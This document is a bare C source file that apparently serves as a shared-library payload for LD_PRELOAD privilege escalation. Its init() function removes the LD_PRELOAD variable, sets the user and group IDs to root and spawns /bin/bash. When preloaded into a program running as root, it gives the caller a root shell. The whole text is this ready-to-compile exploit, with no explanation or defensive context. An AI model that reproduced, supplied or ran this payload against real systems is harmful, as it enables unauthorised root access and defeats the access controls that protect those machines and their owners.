#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}